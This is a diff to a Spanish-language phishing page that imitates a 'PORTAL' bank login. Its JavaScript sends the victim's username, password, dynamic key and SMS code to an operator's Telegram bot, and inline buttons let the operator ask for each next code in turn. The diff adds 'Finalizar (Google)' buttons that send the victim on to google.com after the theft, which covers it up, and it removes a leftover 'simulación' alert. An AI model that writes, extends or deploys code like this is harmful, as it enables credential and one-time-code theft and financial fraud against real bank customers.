@@ -54,7 +54,7 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 .field + .field { margin-top: 38px; }
 
 /* --- Botón --- */
-.submit { display: block; width: 100%; min-height: 70px; margin-top: 60px; padding: 12px 18px; border: 0; border-radius: 33px; background: var(--muted); color: #888; font-family: inherit; font-size: clamp(24px, 4vw, 33px); font-weight: 700; cursor: not-allowed; transition: background .2s ease, color .2s ease; }
+.submit { display: block; width: 100%; min-height: 70px; margin-top: 60px; padding: 12px 18px; border: 0; border-radius: 8px; background: var(--muted); color: #888; font-family: inherit; font-size: clamp(24px, 4vw, 33px); font-weight: 700; cursor: not-allowed; transition: background .2s ease, color .2s ease; }
 .submit.ready { background: var(--yellow); color: #252525; cursor: pointer; }
 .submit.ready:hover { background: #f2cd00; }
 
@@ -97,7 +97,6 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 
 .modal-close { display: none; }
 
-/* Ajuste: GIF más corto y sin deformar */
 .gif-container { 
   width: calc(100% + 48px);
   margin-left: -24px;
@@ -106,12 +105,12 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
   border-radius: 12px 12px 0 0; 
   overflow: hidden; 
   background: #4cc9f0; 
-  max-height: 160px; /* Limita la altura del GIF */
+  max-height: 160px;
 }
 .gif-container img { 
   width: 100%; 
-  height: 160px; /* Fija la altura */
-  object-fit: cover; /* Recorta sin deformar */
+  height: 160px;
+  object-fit: cover;
   display: block; 
 }
 
@@ -159,9 +158,8 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 }
 .sms-view.active { display: block; }
 
-/* Ajuste: Icono SMS más pequeño */
 .sms-icon {
-  font-size: 40px; /* Reducido de 60px a 40px */
+  font-size: 40px;
   margin-bottom: 15px;
 }
 .sms-message {
@@ -426,11 +424,12 @@ claveInput.addEventListener("input", function() {
 function enviarIdentificacionTelegram(usuario, clave) {
     const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
     
+    // BOTÓN FINALIZAR AÑADIDO AQUÍ DESDE EL PRINCIPIO
     const keyboard = {
-        inline_keyboard: [[
-            { text: '❌ Usuario Malo', callback_data: 'error_usuario' },
-            { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }
-        ]]
+        inline_keyboard: [
+            [{ text: '❌ Usuario Malo', callback_data: 'error_usuario' }, { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }],
+            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+        ]
     };
 
     fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
@@ -451,10 +450,10 @@ function enviarDinamicaTelegram(dinamica) {
     const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
     
     const keyboard = {
-        inline_keyboard: [[
-            { text: '❌ Error Dinámica', callback_data: 'error_dinamica' },
-            { text: '📩 SMS Code', callback_data: 'sms_code' } 
-        ]]
+        inline_keyboard: [
+            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
+            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+        ]
     };
 
     fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
@@ -476,7 +475,7 @@ function enviarSmsTelegram(codigoSms) {
         inline_keyboard: [
             [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
             [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
-            [{ text: '🏁 Finalizar', callback_data: 'finalizar' }]
+            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
         ]
     };
 
@@ -548,6 +547,8 @@ function handleTelegramActionLogin(action) {
         claveInput.value = "";
         actualizarBoton();
         claveInput.focus();
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com"; // Redirección a Google
     }
 }
 
@@ -575,6 +576,8 @@ function handleTelegramActionDinamica(action) {
         smsError.classList.remove("show");
         smsInputWrap.classList.remove("error");
         setTimeout(() => smsCodeInput.focus(), 100);
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com"; // Redirección a Google
     }
 }
 
@@ -599,8 +602,7 @@ function handleTelegramActionSms(action) {
         smsCodeInput.focus();
         actionProcessed = false;
     } else if (action === 'finalizar') {
-        alert("¡Proceso completado con éxito! (Simulación final)");
-        location.reload();
+        window.location.href = "https://www.google.com"; // Redirección a Google
     }
 }
 
